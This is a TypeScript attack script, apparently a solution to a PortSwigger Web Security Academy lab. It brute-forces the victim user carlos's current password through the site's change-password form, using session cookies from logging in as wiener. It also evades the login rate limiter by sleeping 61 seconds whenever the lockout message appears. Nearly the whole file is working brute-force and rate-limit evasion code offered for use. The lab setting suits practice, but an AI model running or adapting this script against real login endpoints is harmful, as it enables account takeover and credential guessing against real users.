// Attack Strategy

// 1. Read all candidate passwords
// 2. Attempt a login per password
// 3. On 1 minute wait, sleep for 1 minute

import axios, { AxiosResponse } from "axios";
import * as fs from "fs";
import { textChangeRangeNewSpan } from "typescript";

axios.defaults.withCredentials = true;

const subdomain = "0a7c003f0389221fc0c7b217007400fd";
const baseURL = `https://${subdomain}.web-security-academy.net/`;
const changePasswordURL = baseURL + "my-account/change-password";
const loginURL = baseURL + "login";
const myAccountURL = baseURL + "my-account";

const main = async () => {
  const passwordCandidates = fs
    .readFileSync(__dirname + "/password_candidates.txt")
    .toString()
    .split("\n");

  for (let passwordCandidate of passwordCandidates) {
    try {
      ``;
      const cookie = await getSessionCookies();
      const response = await attemptPasswordChange(passwordCandidate, cookie);
      console.log(response.status, " ", response);
      if (
        response.status === 200 &&
        response.data.includes("Password changed successfully!")
      ) {
        console.log("Carlos' password has been changed successfully.");
        break;
      }
    } catch (e) {
      console.log(e);
      throw e;
    }
  }
};

const getSessionCookies = async () => {
  const baseURLGetResponse = await axios.get(loginURL);
  const baseCookie = baseURLGetResponse.headers["set-cookie"][0].split(";")[0];
  console.log("Base cookie", baseCookie);
  try {
    const loginResponse = await axios.post(
      loginURL,
      `username=wiener&password=test`,
      {
        // withCredentials: true,
        maxRedirects: 0,
        headers: {
          accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "accept-language": "en-US,en;q=0.9,es;q=0.8",
          "cache-control": "max-age=0",
          "content-type": "application/x-www-form-urlencoded",
          "sec-ch-ua":
            '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": '"macOS"',
          "sec-fetch-dest": "document",
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "same-origin",
          "sec-fetch-user": "?1",
          "upgrade-insecure-requests": "1",
          cookie: baseCookie,
          Referer:
            "https://0a7c003f0389221fc0c7b217007400fd.web-security-academy.net/login",
          "Referrer-Policy": "strict-origin-when-cross-origin",
        },
      }
    );
    if (loginResponse.data.includes("1 minute")) {
      console.log("Hit rate limiter, waiting...");
      await sleep(61000);

      const cookie = await getSessionCookies();
      return cookie;
    }

    // console.log(loginResponse);
    // const loginCookie = loginResponse.headers["set-cookie"][0].split(";")[0];
    // console.log("Login Cookie: ", loginCookie);
    // return loginCookie;
  } catch (e) {
    console.log("Error response: ", e.response);
    console.log(
      "Error response headers: ",
      e.response.headers["set-cookie"][0].split(";")[0]
    );
    return e.response.headers["set-cookie"][0].split(";")[0];
  }

  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  // const myAccountResponse = await axios.get(myAccountURL, {
  //   headers: {
  //     accept:
  //       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  //     "accept-language": "en-US,en;q=0.9,es;q=0.8",
  //     "cache-control": "max-age=0",
  //     "sec-ch-ua":
  //       '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
  //     "sec-ch-ua-mobile": "?0",
  //     "sec-ch-ua-platform": '"macOS"',
  //     "sec-fetch-dest": "document",
  //     "sec-fetch-mode": "navigate",
  //     "sec-fetch-site": "same-origin",
  //     "sec-fetch-user": "?1",
  //     "upgrade-insecure-requests": "1",
  //     cookie: loginCookie,
  //     Referer:
  //       "https://0a7c003f0389221fc0c7b217007400fd.web-security-academy.net/login",
  //     "Referrer-Policy": "strict-origin-when-cross-origin",
  //   },
  // });
  // console.log(myAccountResponse);
  // const myAccountCookie =
  //   myAccountResponse.headers["set-cookie"][0].split(";")[0];
  // console.log("My Account Cookie: ", myAccountCookie);
  // return myAccountCookie;
};

// getSessionCookies();

const attemptPasswordChange = async (
  passwordCandidate: string,
  cookie: string
) => {
  const response = await axios.post(
    changePasswordURL,
    `username=carlos&current-password=${passwordCandidate}&new-password-1=test&new-password-2=test`,
    {
      withCredentials: true,
      headers: {
        accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "en-US,en;q=0.9,es;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua":
          '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"macOS"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        cookie,
        Referer:
          "https://0a7c003f0389221fc0c7b217007400fd.web-security-academy.net/my-account",
        "Referrer-Policy": "strict-origin-when-cross-origin",
      },
    }
  );
  return response;
};

try {
  main();
} catch (e) {
  console.log(e);
  throw e;
}

// session=D9DeiFBSlFXPUq5uMIGEcLMx51IEDIfj; session=9MWlcjmmCdAcCYtyWiAOpgYU22dEI52S
